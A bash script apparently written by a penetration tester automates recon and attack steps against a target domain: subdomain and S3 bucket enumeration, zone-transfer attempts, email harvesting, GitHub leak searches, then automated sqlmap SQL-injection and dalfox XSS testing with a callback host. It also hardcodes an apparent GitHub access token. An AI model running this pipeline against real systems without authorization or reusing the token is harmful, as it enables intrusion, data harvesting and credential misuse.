#!/bin/bash
# TAREAS 
# mover todos los docs, excels a archivos
# sacar metadatos con exiftool 
# Comentar varias lineas  CTRL + k + c
# Descomentar varias lineas  CTRL + k + u
THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'


#WEB
#https://github.com/MrSqar-Ye/BadMod
#https://www.kitploit.com/2018/04/jcs-joomla_vulnerability-component.html
#https://github.com/steverobbins/magescan
#https://github.com/fgeek/pyfiscan
#https://github.com/vortexau/mooscan


# mobile app
#https://github.com/UltimateHackers/Diggy
#https://github.com/Security-Onion-Solutions/security-onion

#Vuln app
#https://github.com/logicalhacking/DVHMA

#other
#https://github.com/m4ll0k/iCloudBrutter
#https://github.com/Moham3dRiahi/XBruteForcer
#https://github.com/mthbernardes/ipChecker
#https://www.kitploit.com/2018/02/roxysploit-penetration-testing-suite.html
#https://www.kitploit.com/2018/02/grouper-powershell-script-for-helping.html
#https://github.com/B16f00t/whapa

function print_ascii_art {
cat << "EOF"
 _______  _______  _______  _______  _       
(  ____ )(  ____ \(  ____ \(  ___  )( (    /|
| (    )|| (    \/| (    \/| (   ) ||  \  ( |
| (____)|| (__    | |      | |   | ||   \ | |
|     __)|  __)   | |      | |   | || (\ \) |
| (\ (   | (      | |      | |   | || | \   |
| ) \ \__| (____/\| (____/\| (___) || )  \  |
|/   \__/(_______/(_______/(_______)|/    )_)                                             

		daniel.torres@owasp.org
		https://github.com/DanielTorres1

EOF
}


print_ascii_art

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
	}
	


while getopts ":d:k:" OPTIONS
do
            case $OPTIONS in
            d)     DOMINIO=$OPTARG;;
            k)     KEYWORD=$OPTARG;;            
            ?)     printf "Opcion Invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

DOMINIO=${DOMINIO:=NULL}
KEYWORD=${KEYWORD:=NULL}


#echo "NOMBRE ENTIDAD $NOMBRE"

##################
#  ~~~ Menu ~~~  #
##################

if [ -z "$DOMINIO" ]; then
echo " USO: recon.sh -d [dominio] -n [nombre de la entidad en linkedin] -c [UNA palabra para filtrar resultados]"
echo ""
exit
fi
######################

mkdir $DOMINIO
cd $DOMINIO

mkdir .arp
mkdir .escaneos
mkdir .datos
mkdir .escaneo_puertos	
mkdir .escaneo_puertos_banners
mkdir .banners
mkdir .banners2
mkdir .enumeracion
mkdir .enumeracion2 
mkdir .vulnerabilidades
mkdir .vulnerabilidades2 
mkdir reportes
mkdir servicios
mkdir .tmp
mkdir -p logs/cracking
mkdir -p logs/enumeracion
mkdir -p logs/vulnerabilidades

mkdir webClone
mkdir importarMaltego
mkdir -p archivos	
touch .enumeracion/"$DOMINIO"_google_googlehacking.txt
cp /usr/share/lanscanner/.resultados.db .
echo -e "$OKORANGE+ -- --=############ Usando servidor DNS  ... #########$RESET"
grep nameserver /etc/resolv.conf
echo -e "$OKORANGE+ -- --=############ ############## #########$RESET"
echo ""

echo -e "$OKORANGE Escaneado $DOMINIO con $KEYWORD $RESET"
echo -e "$OKBLUE+ -- --=############ Revisando Amazon S3 #########$RESET"
# generar nombres de buckets en base al dominio
bucket-namegen.sh $KEYWORD >> logs/enumeracion/"$DOMINIO"_buckets_names.txt
bucket-namegen.sh `echo $DOMINIO | cut -d '.' -f1` >> logs/enumeracion/"$DOMINIO"_buckets_names.txt

#verificar si existen
s3scanner  scan --buckets-file logs/enumeracion/"$DOMINIO"_buckets_names.txt 2>/dev/null| tee -a logs/enumeracion/"$DOMINIO"_amazon_s3scanner.txt
grep bucket_exists logs/enumeracion/"$DOMINIO"_amazon_s3scanner.txt > .enumeracion/"$DOMINIO"_amazon_s3scanner.txt
grep --color=never Read .enumeracion/"$DOMINIO"_amazon_s3scanner.txt > .vulnerabilidades/"$DOMINIO"_amazon_s3scanner.txt
########################



####################  DNS test ########################
echo -e "$OKBLUE+ -- --=############ Reconocimiento DNS  ... #########$RESET"


echo -e "\t[+] Iniciando dnsrecon (DNS info) .."
dnsrecon -d $DOMINIO --lifetime 60  > logs/enumeracion/dnsrecon.txt &

echo -e "\t[+] Iniciando Amass"
amass enum -src -min-for-recursive 2 -d $DOMINIO -config /usr/share/recon-config/amass-config.ini > logs/enumeracion/amass2.txt &

echo -e "\t[+] Intentando Volcado de zona .."
dig ns $DOMINIO +short | tee -a logs/enumeracion/dig.txt

while read nameserver
do
        zone=$(dig  @${nameserver} $DOMINIO. axfr)        
        if echo "$zone" | grep -Ei '(Transfer failed|failed|network unreachable|error|connection reset)' &>/dev/null ; then
			#echo -e "${red}zone Transfer ${none}${blue}[Failed]${none}${red} in ${line} Server${none}"
			echo -e "\t[+] Iniciando gobuster (bruteforce DNS ) .."
			#dnsenum $DOMINIO --nocolor -f /usr/share/recon-config/hosts.txt --noreverse --threads 3 | tee -a logs/enumeracion/gobuster.txt 2>/dev/null &			
			#Generando subdominios mediante google
			commonspeak --project subs-321713 --credentials /usr/share/recon-config/commonspeak-llave-google.json subdomains -o /usr/share/wordlists/subdomains-commonspeak2.txt
			cat /usr/share/recon-config/hosts.txt /usr/share/wordlists/subdomains-commonspeak2.txt | sort | uniq >/usr/share/wordlists/hosts-all.txt			
			gobuster dns -d $DOMINIO -w /usr/share/wordlists/hosts-all.txt | tee -a logs/enumeracion/gobuster.txt 2>/dev/null &
						
        else
			echo -e "$OKRED \t  [!] Volcado de zona detectado !! $RESET"		
			
			echo -e "${green}zone Transfer ${none}${blue}[SUCCESS]${none}${green} in ${line} Server${none}"
			echo "zonetransfer successful" >> logs/enumeracion/zonetransfer.txt			
        fi
        echo "$zone" >> logs/enumeracion/zonetransfer.txt
done < logs/enumeracion/dig.txt
#rm /tmp/ns

echo -e "\t[+] generando subdominios con subbrute y dnsgen"
subbrute.py /usr/share/recon-config/names.txt $DOMINIO | massdns -r /usr/share/recon-config/resolvers.txt -t A -o S -w logs/enumeracion/subbrute.txt 2> logs/enumeracion/subbrute2.txt
echo $DOMINIO | dnsgen - | massdns -r /usr/share/wordlists/resolvers.txt -t A -o S > logs/enumeracion/dnsgen.txt 2> logs/enumeracion/dnsgen2.txt


echo -e "\t[+] Iniciando Sublist3r ( Baidu, Yahoo, Google, Bing, Ask, Netcraft, DNSdumpster, Virustotal, ThreatCrowd, SSL Certificates, PassiveDNS) .."
Sublist3r.sh -d $DOMINIO | grep --color=never $DOMINIO | tee -a `pwd`/logs/enumeracion/Sublist3r2.txt
cat logs/enumeracion/Sublist3r2.txt | cut -d ":" -f1 | grep -vi "enumerating" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > logs/enumeracion/Sublist3r.txt

echo -e "\t[+] Iniciando subfinder (  alienvault, anubis, archiveis, binaryedge, bufferover, censys, certspotter, commoncrawl, crtsh, dnsdumpster, dnsdb, github, hackertarget rapiddns, riddler, robtex, securitytrails, shodan, sitedossier, sonarsearch, spyse, threatcrowd, threatminer, virustotal, waybackarchive .."
subfinder -all -d $DOMINIO | tee -a logs/enumeracion/subfinder.txt
# falta passivetotal, recon.dev , threatbook , urlscan, zoomeye

echo -e "\t[+] Iniciando findomain ( Crtsh API, CertSpotter API, facebook) .."
findomain --all-apis --target $DOMINIO > logs/enumeracion/findomain.txt


echo -e "\t[+] Iniciando assetfinder .."
assetfinder $DOMINIO > logs/enumeracion/assetfinder.txt

echo -e "\t[+] Iniciando gsan ."
docker run -it gsan crtsh $DOMINIO | tee -a logs/enumeracion/gsan-crtsh2.txt
cat logs/enumeracion/gsan-crtsh2.txt | grep '32m' | awk '{print $2}' | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > logs/enumeracion/gsan-crtsh.txt




##################### Email, subdominios #################

echo -e "$OKBLUE+ -- --=############ Obteniendo  correos,subdominios, etc ... #########$RESET"
echo -e "\t[+] Iniciando whois .."
whois $DOMINIO > .enumeracion/"$DOMINIO"_dns_whois.txt

echo -e "\t[+] Iniciando theHarvester .."
echo -e "\t\t[+] Buscando correos en google .."
theHarvester -d $DOMINIO -b google > logs/enumeracion/theHarvester_google.txt 2>/dev/null
echo -e "\t\t[+] Buscando correos en bing .."
theHarvester -d $DOMINIO -b bing > logs/enumeracion/theHarvester_bing.txt 2>/dev/null


echo -e "\t[+] Iniciando infoga .."
#docker run infoga --domain $DOMINIO -s all | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a logs/enumeracion/infoga.txt 2>/dev/null &

#################

######### DNS spoof ########

echo -e "$OKBLUE+ -- --=############ Probando si se puede spoofear el dominio... #########$RESET"

docker run -it spoofcheck $DOMINIO | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  | tee -a logs/vulnerabilidades/"$DOMINIO"_dns_spoof.txt
egrep -iq "Spoofing possible" logs/vulnerabilidades/"$DOMINIO"_dns_spoof.txt
greprc=$?
if [[ $greprc -eq 0 ]] ; then			
	cp logs/vulnerabilidades/"$DOMINIO"_dns_spoof.txt .vulnerabilidades/"$DOMINIO"_dns_spoof.txt		
fi
#insert_data
######## ###



##################### search engines #################
## linked in
#echo -e "$OKBLUE+ -- --=############ Obteniendo lista de empleados de linkedin ... #########$RESET" 
#linkedinFinder.pl -n "$NOMBRE"  -l logs/enumeracion/"$DOMINIO"_linkedin.csv
#grep --color=never -ai "$NOMBRE" logs/enumeracion/"$DOMINIO"_linkedin.csv  > reportes/linkedin.csv

	



####### wait to finish ########
  while true; do
	dnsenum_instances=$((`ps aux | egrep "dnsenum|amass|infoga|gobuster" | wc -l` - 1)) 
  if [ "$dnsenum_instances" -gt 0 ]
	then
		echo "Todavia hay escaneos de gobuster o amass activos ($dnsenum_instances)"  
		sleep 30
	else
		break		  		 
	fi				
  done
##############################
	  
######## extraer correos ###########
cat logs/enumeracion/theHarvester_google.txt | grep --color=never @ | egrep -v "edge-security|Connection timed out" >> .enumeracion/"$DOMINIO"_correos.txt
cat logs/enumeracion/theHarvester_bing.txt | grep --color=never @ | egrep -v "edge-security|Connection timed out" >> .enumeracion/"$DOMINIO"_correos.txt
#cat logs/enumeracion/infoga.txt | grep -i --color=never "email:" | awk '{print $3}' >> .enumeracion/"$DOMINIO"_correos.txt



# dar formato para importar a maltego
#lines=`wc -l .enumeracion/"$DOMINIO"_correos.txt | cut -d " " -f1`
#perl -E "say \"$DOMINIO\n\" x $lines" > DOMINIO.txt # file with the DOMINIO (n times)
#sed -i '$ d' DOMINIO.txt # delete last line
#paste -d ',' DOMINIO.txt .enumeracion/"$DOMINIO"_correos.txt > importarMaltego/correos1.csv 
#cat importarMaltego/correos1.csv  | sort | uniq > importarMaltego/correos.csv 
#rm importarMaltego/correos1.csv DOMINIO.txt
#####################################
	  
######## extraer subdominios ###########
egrep -qi "zonetransfer successful" logs/enumeracion/zonetransfer.txt 
greprc=$?
if [[ $greprc -eq 0 ]] ; then 
	# Si se hizo volcado de zona		
	grep "IN     A" logs/enumeracion/zonetransfer.txt | awk '{print $5,$1}' | tr ' ' ',' >> subdominios.txt
	# 200.105.172.195;soberaniaalimentaria.gob.bo.
	grep "IN	A" logs/enumeracion/zonetransfer.txt | awk '{print $5,$1}' | tr ' ' ',' >> subdominios.txt	
	grep "CNAME" logs/enumeracion/zonetransfer.txt | awk '{print $1}' | tr ' ' ',' >> subdominios.txt
	cp logs/enumeracion/zonetransfer.txt  .vulnerabilidades/"$DOMINIO"_dns_transferenciaDNS.txt
else	
	#dnsenum		
	grep "Found" logs/enumeracion/gobuster.txt | awk '{print $2}' >> subdominios.txt

fi


# Sublist3r
#www.comibol.gob.bo
cat logs/enumeracion/Sublist3r.txt  >> subdominios.txt

# findomain
#  --> correo.siahcomibol.gob.bo
cat logs/enumeracion/findomain.txt | egrep --color=never "\-\-|>>" |  awk '{print $2}' >> subdominios.txt

# subfinder
cat logs/enumeracion/subfinder.txt  >> subdominios.txt

# assetfinder
cat logs/enumeracion/assetfinder.txt >> subdominios.txt

# subbrute
cat logs/enumeracion/subbrute.txt| awk '{print $1}' | xargs -n1 host | grep --color=never "has address" | awk '{print $1}' >> subdominios.txt

# dnsgen
cat logs/enumeracion/dnsgen.txt| awk '{print $1}' | xargs -n1 host | grep --color=never "has address" | awk '{print $1}' >> subdominios.txt

# gsan
cat logs/enumeracion/gsan-crtsh.txt  >> subdominios.txt 
#cat logs/enumeracion/gsan-scan.txt  >> subdominios.txt

#amass
cat logs/enumeracion/amass2.txt  | cut -d "]" -f 2 | sed "s/ //g" >>  logs/enumeracion/amass.txt
cat logs/enumeracion/amass.txt >> subdominios.txt

# theHarvester y google
cat logs/enumeracion/theHarvester_google.txt | grep --color=never $DOMINIO | egrep -iv "target|empty|@|harvesting" | cut -d ":" -f1 >> subdominios.txt
cat logs/enumeracion/theHarvester_bing.txt| grep --color=never $DOMINIO |egrep -iv "target|empty|@|harvesting" | cut -d ":" -f1  >> subdominios.txt

echo -e "$OKBLUE+ -- --=############ Buscando mediante DNS reverse #########$RESET"
#obtener los rangos de IPs
cat subdominios.txt | cut -d "." -f1 | sort | uniq > logs/enumeracion/hosts-prefijo.txt #filtrar los subdominios validos
dnsenum linkser.com.bo --nocolor -f logs/enumeracion/hosts-prefijo.txt --noreverse --threads 3 2>/dev/null | grep --color=never "/24" > logs/enumeracion/"$DOMINIO"_dnsenum_net.txt

cat logs/enumeracion/"$DOMINIO"_dnsenum_net.txt | xargs -n1 prips | hakrevdns > logs/enumeracion/"$DOMINIO"_dns_hakrevdns.txt
grep --color=never $DOMINIO logs/enumeracion/"$DOMINIO"_dns_hakrevdns.txt |  awk '{print $2}' >> subdominios.txt
############################################

#Eliminar caractares extranios
dos2unix subdominios.txt

#Eliminar punto extra al final
sed -i "s/$DOMINIO\./$DOMINIO/g" subdominios.txt 

#filtrar dominios
egrep -iv --color=never '\--|Testing|Trying|TARGET|subDOMINIOs|DNS|\:\:|\*' subdominios.txt | sort | uniq -i > solo_subdominios.txt


echo -e "\t$OKBLUE[+] Iniciando subjack .. $RESET"
subjack -w solo_subdominios.txt -t 100 -timeout 30 -ssl -c /usr/share/lanscanner/fingerprints-domain.json -v 3 > logs/vulnerabilidades/"$DOMINIO"_dns_subjack.txt 


echo -e "\t$OKBLUE[+] Iniciando altdns .. $RESET"
#limpiar subdominios que no resuelven
cat solo_subdominios.txt | xargs -n1 host | grep --color=never "has address" | awk '{print $1}' | sort | uniq > solo_subdominios_validos.txt
docker run  -v $(pwd):/home:rw -it altdns -i /home/solo_subdominios_validos.txt -o /home/alter-domains.txt -w /words.txt -r -s /home/altdns.txt
cat /home/altdns.txt .enumeracion/"$DOMINIO"_dns_altdns.txt


#Verificar subdominios vulnerables
grep -v "Not Vulnerable" logs/vulnerabilidades/"$DOMINIO"_dns_subjack.txt  > .vulnerabilidades/"$DOMINIO"_dns_subjack.txt 


echo -e "\t$OKBLUE[+] Resolviendo dominios $RESET"
for line in `cat solo_subdominios.txt`;
do 		
	#Si ya tiene ip identificada
	if [[ ${line} == *";"*  ]];then 
			line=`echo $line | tr ';' ','` # Convertir ; --> ,
			echo $line >> ip_subdominio.txt
	else
		#descubrir a que ip resuelve
		hostline=`host $line | egrep -v "alias|IPv6"`
		total_ips=$(echo $hostline | grep -o address | wc -l)					
		
		#Si tiene mas de una IP
		if [ $total_ips -gt 1 ];
		then								
			ip=`echo $hostline| grep address|  cut -d " " -f4`
			#echo "ip $ip"
			echo "$ip,$line" >> ip_subdominio.txt
			
			ip2=`echo $hostline| grep address|  cut -d " " -f8`
			#echo "ip2 $ip2"
			echo "$ip2,$line" >> ip_subdominio.txt
		else
			#Si tiene una ip
			ip=`echo $hostline| grep address| cut -d " " -f4`			
			if [ -n "$ip" ]; then
				echo "$ip,$line" >> ip_subdominio.txt
			fi
			
		fi 															
	fi		
done

sort ip_subdominio.txt | uniq -i > ip_subdominios_uniq.txt
#rm subdominios.txt solo_subdominios.txt ip_subdominio.txt

echo -e "$OKBLUE+ -- --=############ Obteniendo Informacion shodan #########$RESET"
shodan_eye.py -k $DOMINIO | tee -a logs/enumeracion/shodan.txt
grep --color=never "IP " logs/enumeracion/shodan.txt |  awk '{print $2}' > .enumeracion/"$DOMINIO"_shodan_ip.txt

echo -e "$OKBLUE+ -- --=############ Obteniendo Informacion de SPF #########$RESET"
assets-from-spf.sh $DOMINIO | tee -a logs/enumeracion/assets-from-spf.txt
cat logs/enumeracion/assets-from-spf.txt .enumeracion/"$DOMINIO"_spf_ip.txt



echo -e "$OKBLUE+ -- --=############ Obteniendo GeoInformacion de las IPs #########$RESET"

# de los subdominios identificados
while read line           
do           
    ip=$(echo  $line | cut -d "," -f1)
    subdominio=$(echo  $line | cut -d "," -f2)    
    echo "Obteniendo datos del subdominio: $subdominio"
    geodata=$(geoip.pl $ip s| tr ';' ',')
    echo "$DOMINIO,$subdominio,$ip,$geodata" >> importarMaltego/subdominios.csv
    #echo "$ip,$subdominio,$geodata" >> .enumeracion/"$DOMINIO"_subdominios.txt
    #perl -i -pe 's/[^[:ascii:]]//g' .enumeracion/"$DOMINIO"_subdominios.txt #remover caracteres especiales
    perl -i -pe 's/[^[:ascii:]]//g' importarMaltego/subdominios.csv
    
done <ip_subdominios_uniq.txt


cat .enumeracion/"$DOMINIO"_spf_ip.txt .enumeracion/"$DOMINIO"_shodan_ip.txt | sort | uniq > extra_ip.txt

# de las IPs descubiertas por shodan y SPF
while read ip           
do                   

   grep -qi "$ip"  importarMaltego/subdominios.csv
   greprc=$?
   if [[ $greprc -eq 0 ]];then 			    
	 echo "La ip $ip ya fue identificada"
   else
      echo "Obteniendo datos de la ip: $ip"
      geodata=$(geoip.pl $ip | tr ',' ' ' | tr ';' ',')
      echo "$DOMINIO,,$ip,$geodata" >> importarMaltego/subdominios.csv       
      perl -i -pe 's/[^[:ascii:]]//g' importarMaltego/subdominios.csv    
   fi
							   
done <extra_ip.txt


#rm ip_subdominios_uniq.txt
#insert_data
rm cookies.txt 2>/dev/null
######################################################


echo -e "$OKBLUE+ -- --=############ Obteniendo Informacion la deep web (keyword = $keyword) #########$RESET"
/etc/init.d/tor start
onionsearch "$DOMINIO" --proxy 127.0.0.1:9050 --output logs/enumeracion/"$DOMINIO"_deep_web.txt
onionsearch "$keyword" --proxy 127.0.0.1:9050 --output logs/enumeracion/"$DOMINIO"_deep_web1.txt

cp logs/enumeracion/"$DOMINIO"_deep_web.txt .enumeracion/"$DOMINIO"_deep_web.txt
cp logs/enumeracion/"$DOMINIO"_deep_web1.txt .enumeracion/"$DOMINIO"_deep_web1.txt


echo -e "$OKBLUE+ -- --=############ Verificando su hay fuga de datos en github #########$RESET"
echo -e "$OKBLUE  github-subdomains  $RESET"
github-subdomains -d $DOMINIO -t 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 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  | tee -a  logs/enumeracion/"$DOMINIO"_github_leak.txt
grep "github.com" logs/enumeracion/"$DOMINIO"_github_leak.txt | grep -v api.github.com | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$DOMINIO"_github_leak.txt

#  git-hound - secrets 
echo -e "$OKBLUE  git-hound $keyword $RESET"
echo $keyword |  git-hound | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > logs/enumeracion/"$DOMINIO"_github_githound.txt

egrep -iq "https" logs/enumeracion/"$DOMINIO"_github_githound.txt
greprc=$?
	if [[ $greprc -eq 0 ]] ; then					
		cp logs/enumeracion/"$DOMINIO"_github_githound.txt .enumeracion/"$DOMINIO"_github_githound.txt
	fi	
	
# gitgot 
gitgot.py -q $keyword > logs/enumeracion/"$DOMINIO"_github_gitgot.txt
github-finder.py -f logs/enumeracion/"$DOMINIO"_github_gitgot.txt -d $DOMINIO > .vulnerabilidades/"$DOMINIO"_github_gitgot.txt


echo -e "$OKBLUE+ -- --=############ verificar que subdominios tienen los protocolos http(s) habilitados #########$RESET"
sort -u solo_subdominios.txt | httprobe --prefer-https -t 20000 -c 50 -p 8080,8081,8089 | tee -a aplicaciones_web.txt

while read url
do     								
	echo -e "$OKBLUE Crawling $url  $RESET"
	subdominio=$url
	subdominio=`echo "${subdominio/https:\/\//}"`
	subdominio=`echo "${subdominio/http:\/\//}"`	
	
	docker run gsan scan "$subdominio":443 | grep '32m' | awk '{print $2}' | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a logs/enumeracion/"$subdominio"_dns_gsan.txt
								#borrar los colores
	blackwidow -u $url | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | sort | uniq | tee -a .enumeracion/"$subdominio"_web_crawled.txt
				
done <aplicaciones_web.txt


echo -e "$OKBLUE Buscando en common crawler  $RESET"
common-crawler.py -d $DOMINIO > .enumeracion/"$DOMINIO"_common_crawler.txt
#decodificar en URL
fileDecode.py --file .enumeracion/"$DOMINIO"_common_crawler.txt


echo -e "$OKBLUE+ -- --=############ Obteniendo capturas de pantalla de servicios web #########$RESET"
EyeWitness.sh --web -f `pwd`/aplicaciones_web.txt -d `pwd`/EyeWitness




# verificar si hay dominios adicionales de la entidad
cat logs/enumeracion/*_dns_gsan.txt | grep -v "$DOMINIO" | sort | uniq > .enumeracion/"$DOMINIO"_domain_extra.txt 

#sed 's/txt:/;/g' 

echo -e "$OKBLUE+ -- --=############ Obteniendo URL cacheados en wayback #########$RESET"
waybackurls $DOMINIO | sort | uniq | httpx -title -tech-detect -status-code -follow-redirects | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > logs/enumeracion/"$DOMINIO"_web_wayback.txt
cat logs/enumeracion/"$DOMINIO"_web_wayback.txt | egrep -v "\[404\]|,404" > .enumeracion/"$DOMINIO"_web_wayback.txt


#COMENTADO
echo -e "$OKBLUE+ -- --=############ Recopilando URL indexadas ... #########$RESET" 

while read line
do     						
	subdomain=`echo $line | cut -f2 -d","`
	
	if [ -z "$subdomain" ]
	then
      echo "Upps no hay subdominio disponible"
	else
      echo -e "[+] Recopilando webs indexados: $subdomain"      
	  if [ "$subdomain" != "$DOMINIO" ];
	  then		
		google.pl -t "site:$subdomain" -o .enumeracion/"$subdomain"_web_indexado.txt -l logs/enumeracion/"$subdomain"_web_google.html 
		sleep 60
		echo -e "$OKBLUE+ -- --=############ Comprobando si google indexo páginas hackeadas ... #########$RESET" 
		egrep -iq " Buy| Pharmacy | medication| cheap| porn| viagra|hacked|drug" logs/enumeracion/"$subdomain"_web_google.html
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Redirección  a sitios de terceros detectado \n $RESET"
			echo "Vulnerable site:$subdomain" > .vulnerabilidades/"$subdomain"_google_redirect.txt 	
		fi	# redireccion	
  	   fi  # no es dominio principal   
	 fi # si la variable dominio esta seteada
				
done <importarMaltego/subdominios.csv

Si hay el sitio web esta en dominio.com y no en www.dominio.com
count=`ls .enumeracion/*_indexado.txt 2>/dev/null| wc -l`
if [ "$count" -lt 1 ];then
	google.pl -t "site:$DOMINIO" -o .enumeracion/"$DOMINIO"_web_indexado.txt -l logs/enumeracion/"$DOMINIO"_web_google.html 
fi



cat .enumeracion/*_indexado.txt | cut -d "/" -f 3 | cut -d ":" -f1 | grep --color=never $DOMINIO | sort | uniq >> subdominios.txt




echo -e "$OKBLUE+ -- --=############ Obteniendo URL con parametros #########$RESET" 

IFS=$'\n'  

grep --color=never "\?" .enumeracion/*_indexado.txt | sed 's/txt:/;/g' | cut -d ";" -f2 | sort | uniq > logs/enumeracion/parametrosGET2.txt
grep --color=never "\?" .enumeracion/*_web_crawled.txt | cut -d ":" -f2-3 | sort | uniq >> logs/enumeracion/parametrosGET2.txt
grep --color=never "\?" .enumeracion/"$DOMINIO"_common_crawler.txt | sort | uniq >> logs/enumeracion/parametrosGET2.txt


sort logs/enumeracion/parametrosGET2.txt | uniq >> logs/enumeracion/parametrosGET_uniq.txt

#  Eliminar URL repetidas que solo varian en los parametros
current_uri=""
for url in `cat logs/enumeracion/parametrosGET_uniq.txt`; do

	uri=`echo $url | cut -f1 -d"?"`
	param=`echo $line | cut -f2 -d"?"`
	
	
	if [ "$current_uri" != "$uri" ];
	then
		echo  "$url" >> logs/enumeracion/parametrosGET_uniq_final.txt
		current_uri=$uri
	fi
	
done


echo -e "$OKBLUE+ -- --=############ Probando SQL inyection. #########$RESET" 

i=1
for url in `cat logs/enumeracion/parametrosGET_uniq_final.txt`; do
	echo  "$url" | tee -a logs/vulnerabilidades/"$DOMINIO"_"web$i"_sqlmap.txt
	sqlmap -u "$url" --batch --tamper=space2comment --threads 5 | tee -a logs/vulnerabilidades/"$DOMINIO"_"web$i"_sqlmap.txt
	sqlmap -u "$url" --batch  --technique=B --risk=3  --threads 5 | tee -a logs/vulnerabilidades/"$DOMINIO"_"web$i"_sqlmapBlind.txt
	 
	#  Buscar SQLi
	egrep -iq "is vulnerable" logs/vulnerabilidades/"$DOMINIO"_"web$i"_sqlmap.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then			
		echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
		echo "sqlmap -u \"$url\" --batch " > .vulnerabilidades/"$DOMINIO"_"web$i"_sqlmap.txt
	fi
	
	#  Buscar SQLi blind
	egrep -iq "is vulnerable" logs/vulnerabilidades/"$DOMINIO"_"web$i"_sqlmapBlind.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then			
		echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
		echo "sqlmap -u \"$url\" --batch  --technique=B --risk=3" > .vulnerabilidades/"$DOMINIO"_"web$i"_sqlmapBlind.txt
	fi		
	
	
	#  Buscar XSS
	dalfox -b hahwul.xss.ht url $url | tee -a logs/vulnerabilidades/"$DOMINIO"_"web$i"_xss.txt
	#https://z0id.xss.ht/
	 
	
	egrep -iq "Triggered XSS Payload" logs/vulnerabilidades/"$DOMINIO"_"web$i"_xss.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then			
		echo -e "\t$OKRED[!] XSS detectada \n $RESET"
		echo "url $url" >  .vulnerabilidades/"$DOMINIO"_"web$i"_xss.txt
		egrep -ia "Triggered XSS Payload" logs/vulnerabilidades/"$DOMINIO"_"web$i"_xss.txt >> .vulnerabilidades/"$DOMINIO"_"web$i"_xss.txt
	fi		
		
	i=$(( i + 1 ))	
					
done

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 

#Comendado 	
echo -e "$OKBLUE+ -- --=############ Google hacking ... #########$RESET"
								#-o lista de URL													-l resultado html de l busqueda
google.pl -t "site:.s3.amazonaws.com  $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking0.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking0.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking0.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:.s3.amazonaws.com  $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking0.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking0.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:github.com $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:github.com $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	          
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;


google.pl -t "inurl:gitlab $keyword" -o logs/enumeracion/"$DOMINIO"_google_googlehacking1.txt -p 1 -l logs/enumeracion/"$DOMINIO"_google_googlehacking1.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/enumeracion/"$DOMINIO"_google_googlehacking1.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "inurl:gitlab $keyword" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
sed -i '/^\s*$/d' logs/enumeracion/"$DOMINIO"_google_googlehacking1.txt # delete empty lines	
cat logs/enumeracion/"$DOMINIO"_google_googlehacking1.txt >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
echo "" >> .enumeracion/"$DOMINIO"_google_googlehacking.txt	
fi

sleep 10;

google.pl -t "site:$DOMINIO intitle:index.of" -o logs/vulnerabilidades/"$DOMINIO"_google_googlehacking2.txt -p 1 -l logs/vulnerabilidades/"$DOMINIO"_google_googlehacking2.html 
egrep -qi "No se han encontrado resultados|did not match any" logs/vulnerabilidades/"$DOMINIO"_google_googlehacking2.html
greprc=$?
if [[ $greprc -eq 1 ]] ; then # hay resultados
echo "site:$DOMINIO intitle:index.of" >> .vulnerabilidades/"$DOMINIO"_google_googlehacking.txt	
